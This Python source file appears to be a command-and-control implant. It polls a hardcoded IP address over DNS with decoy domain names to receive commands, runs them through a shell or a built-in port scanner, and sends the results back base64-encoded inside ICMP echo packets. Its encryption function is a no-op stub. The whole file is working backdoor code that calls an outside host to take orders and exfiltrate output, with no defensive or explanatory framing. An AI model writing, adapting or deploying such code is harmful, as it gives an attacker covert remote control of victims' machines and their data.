import socket
import struct
from re import findall
import base64
from random import sample
from string import ascii_letters, digits
import sys
import dns.resolver
from time import sleep
from os import system as shell

def checksum(packet):
    s = 0;
    countTo = (len(packet)//2)*2
    count = 0
    while count < countTo:
        s += ((packet[count+1] << 8) | packet[count])
        count += 2
    if countTo < len(packet):
        s += packet[len(packet) -1 ]
        s = s & 0xffffff
    s = (s>>16) + (s&0xffff)
    s = s + (s>>16)
    answer = ~s
    answer = answer & 0xffff
    answer = answer>>8 | (answer<<8 & 0xff00)
    return answer

def send_packet(ip, key, message):
    rawsocket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.getprotobyname("icmp"))
    packet = struct.pack('!BBHHH48s', 8, 0, 0, 1, 0, message.encode('utf-8'))
    chksum = checksum(packet)
    packet = struct.pack('!BBHHH48s', 8, 0, chksum, 1, 0, message.encode('utf-8'))
    rawsocket.sendto(packet, (ip, 0))

def cutmessage(text, lenth):
    result = findall('.{' + str(lenth) + '}', text)
    result.append(text[len(result)*lenth:])
    result[-1] = result[-1]+"@"
    return result

def send_cmdresult(ip, key, message):
    message = AESen(message, key)
    message = base64.b64encode(message.encode(encoding="utf-8"))
    message = message.decode()
    packets = cutmessage(message,40)
    for i in packets:
        send_packet(ip, key, " C* ` }0"+i)

def AESen(message, key):
    result = message
    return result

def online(ip):
    key = ''.join(sample(ascii_letters + digits, 32))
    send_packet(ip, key, "N &< >N@" + key)
    return key

def scan(ip, key,target):
    result = []
    portlist = [7,9,13,21,22,25,37,53,79,80,88,106,110,113,119,135,139,143,179,199,389,427,443,445,465,513,514,543,548,554,587,631,646,873,990,993,995,1025,1026,1027,1028,1110,1433,1720,1723,1755,1900,2000,2049,2121,2717,3000,3128,3306,3389,3986,4899,5000,5009,5051,5060,5101,5190,5357,5432,5631,5666,5800,5900,6000,6646,7070,8000,8008,8080,8443,8888,9100,9999,32768,49152,49153,49154,49155,49156]
    for port in portlist:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            r = s.connect_ex((target, port))
            if r == 0:
                result.append(str(port))
                print(port)
            else:
                continue
        except Exception as e:
            pass
        finally:
            s.close()
    with open("temp.txt", "w") as f:
        f.write("")
    with open("temp.txt", "w+") as f:
        for i in result:
            f.write(i+"\n")

if __name__ == "__main__":
    sleep_time = 1
    ip = "175.24.9.38"
    key = online(ip)
    a = dns.resolver.Resolver()
    a.nameservers = ["175.24.9.38"]
    a.port = 10086
    lastcmd = ""
    cmd = ""
    dnsresult = ""
    cmdresult = ""
    servers = ["www.api.baidu.com", "www.zoom.google.vip", "api.pan.baidu.com", "zz.github.org", "video.blowtoheaven.onion"]
    while True:
        try:
            for n in range(0,5):
                sleep(sleep_time)
                if servers[n][-1:] == ".":
                    servers[n] = servers[n][:-1]
                an = a.query(servers[n])
                for i in an.response.answer:
                    for s in i.items:
                        dnsresult = dnsresult + str(s) + "."
            dnsresult = dnsresult.split(".")
            for i in dnsresult:
                if i == "7":
                    break;
                cmd = cmd + chr(int(i))
            if cmd == lastcmd:
                cmd = ""
                dnsresult = ""
                print("cmd not changed")
                continue
            elif "scan" in cmd:
                target = cmd.split(" ")[1]
                print("target: " + target)
                scan(ip, key, target)
            else:
                shell(cmd+" > temp.txt")
            with open("temp.txt", 'r') as f:
                cmdresult = f.read()
                print(cmdresult)
            send_cmdresult(ip,key,cmdresult)
            dnsresult = ""
            lastcmd = cmd
            cmd = ""
        except:
            print("[ERROR] An except apeared!")
            print("last cmd is: " + lastcmd)
            print("now cmd is: " + cmd)
            pass

